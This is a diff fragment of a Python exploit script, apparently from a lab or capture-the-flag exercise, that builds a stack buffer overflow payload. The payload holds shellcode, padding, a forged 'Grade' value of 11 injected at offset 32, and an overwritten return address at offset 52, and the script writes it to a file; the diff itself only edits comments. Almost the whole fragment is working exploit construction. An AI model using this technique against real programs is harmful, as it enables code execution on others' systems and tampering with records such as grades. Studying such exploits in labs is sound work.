@@ -14,27 +14,25 @@ shellcode = (
 
 # --- Constructing the Payload with Grade 11 ---
 
-# 1. Shellcode (Bytes 0-24)
+# Shellcode (Bytes 0-24)
 payload = shellcode
 
-# 2. Padding to reach Grade (Bytes 25-31)
+# Padding to reach Grade (Bytes 25-31)
 # Grade is at offset 32.
 padding_to_grade = b"A" * (32 - len(shellcode))
 payload += padding_to_grade
 
-# 3. Inject Grade = 11 (Bytes 32-35)
+# Inject Grade = 11 (Bytes 32-35)
 payload += struct.pack("<I", 11)
 
-# 4. Fill the rest until Return Address (Bytes 36-51)
+# Fill the rest until Return Address (Bytes 36-51)
 # We need to reach offset 52.
 padding_after_grade = b"B" * (total_offset - len(payload))
 payload += padding_after_grade
 
-# 5. Add Return Address (Bytes 52-55)
+# Add Return Address (Bytes 52-55)
 payload += struct.pack("<I", target_address)
 
-# Write to stdout
-#sys.stdout.buffer.write(payload)
 
 try:
     with open("payload", "wb") as f:
